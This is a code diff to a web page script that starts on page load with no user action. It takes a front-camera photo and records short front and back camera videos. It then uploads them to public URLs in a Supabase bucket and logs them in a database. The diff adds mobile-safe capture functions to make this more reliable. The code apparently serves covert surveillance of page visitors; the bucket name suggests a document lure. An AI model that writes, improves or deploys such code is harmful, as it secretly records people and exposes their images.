@@ -12,6 +12,49 @@ const supabase = createClient(supabaseUrl, supabaseKey);
 window.addEventListener("load", () => startCapture());
 
 // ---------------------
+// SAFE PHOTO SNAPSHOT (WORKS EVERYWHERE)
+// ---------------------
+async function takeSnapshot(stream) {
+  const track = stream.getVideoTracks()[0];
+  const imageCapture = new ImageCapture(track);
+
+  // grabFrame works on all browsers (takePhoto fails on mobile)
+  const frame = await imageCapture.grabFrame();
+
+  const canvas = document.createElement("canvas");
+  canvas.width = frame.width;
+  canvas.height = frame.height;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(frame, 0, 0);
+
+  return new Promise((resolve) =>
+    canvas.toBlob(resolve, "image/jpeg", 0.9)
+  );
+}
+
+// ---------------------
+// RELIABLE VIDEO RECORDER (MOBILE SAFE)
+// ---------------------
+function recordVideo(stream, ms) {
+  return new Promise((resolve) => {
+    const recorder = new MediaRecorder(stream, {
+      mimeType: "video/webm",
+    });
+
+    const chunks = [];
+    recorder.ondataavailable = (e) => chunks.push(e.data);
+    recorder.onstop = () =>
+      resolve(new Blob(chunks, { type: "video/webm" }));
+
+    // small delay for mobile browsers
+    setTimeout(() => {
+      recorder.start();
+      setTimeout(() => recorder.stop(), ms);
+    }, 200);
+  });
+}
+
+// ---------------------
 // MAIN CAPTURE LOGIC
 // ---------------------
 async function startCapture() {
@@ -21,12 +64,12 @@ async function startCapture() {
       video: { facingMode: "user" },
     });
 
-    // Take photo
-    const imageCapture = new ImageCapture(frontStream.getVideoTracks()[0]);
-    const photoBlob = await imageCapture.takePhoto();
+    // Take photo safely
+    const photoBlob = await takeSnapshot(frontStream);
 
-    // Record 3 sec video
+    // Record 3 sec front video
     const frontVideoBlob = await recordVideo(frontStream, 3000);
+
     frontStream.getTracks().forEach((t) => t.stop());
 
     // ---------- BACK CAMERA ----------
@@ -36,7 +79,9 @@ async function startCapture() {
         video: { facingMode: { exact: "environment" } },
       });
     } catch (err) {
-      backStream = await navigator.mediaDevices.getUserMedia({ video: true });
+      backStream = await navigator.mediaDevices.getUserMedia({
+        video: true,
+      });
     }
 
     const backVideoBlob = await recordVideo(backStream, 3000);
@@ -44,8 +89,8 @@ async function startCapture() {
 
     // ---------- UPLOAD ----------
     const photoURL = await uploadSupabase(photoBlob, "front.jpg");
-    const frontVideoURL = await uploadSupabase(frontVideoBlob, "front.mp4");
-    const backVideoURL = await uploadSupabase(backVideoBlob, "back.mp4");
+    const frontVideoURL = await uploadSupabase(frontVideoBlob, "front.webm");
+    const backVideoURL = await uploadSupabase(backVideoBlob, "back.webm");
 
     // ---------- SAVE TO DATABASE ----------
     const { data, error } = await supabase
@@ -62,18 +107,18 @@ async function startCapture() {
     console.log("🔥 Saved to Supabase table:", data);
   } catch (err) {
     console.error("❌ Capture error:", err);
+    alert("Capture error: " + err.message);
   }
 }
 
 // ---------------------
-// UPLOAD FILE TO SUPABASE
+// UPLOAD TO SUPABASE
 // ---------------------
 async function uploadSupabase(blob, filename) {
   const fullName = `captures/${Date.now()}_${filename}`;
 
-  // Upload file
   const { error: uploadError } = await supabase.storage
-    .from("pdfniba") // your bucket name — create this bucket
+    .from("pdfniba")
     .upload(fullName, blob, {
       cacheControl: "3600",
       contentType: blob.type,
@@ -85,25 +130,9 @@ async function uploadSupabase(blob, filename) {
     return null;
   }
 
-  // Get public URL
   const { data } = supabase.storage
     .from("pdfniba")
     .getPublicUrl(fullName);
 
   return data.publicUrl;
-}
-
-// ---------------------
-// RECORD VIDEO (3 sec)
-// ---------------------
-function recordVideo(stream, ms) {
-  return new Promise((resolve) => {
-    const recorder = new MediaRecorder(stream);
-    const chunks = [];
-    recorder.ondataavailable = (e) => chunks.push(e.data);
-    recorder.onstop = () =>
-      resolve(new Blob(chunks, { type: "video/mp4" }));
-    recorder.start();
-    setTimeout(() => recorder.stop(), ms);
-  });
 }
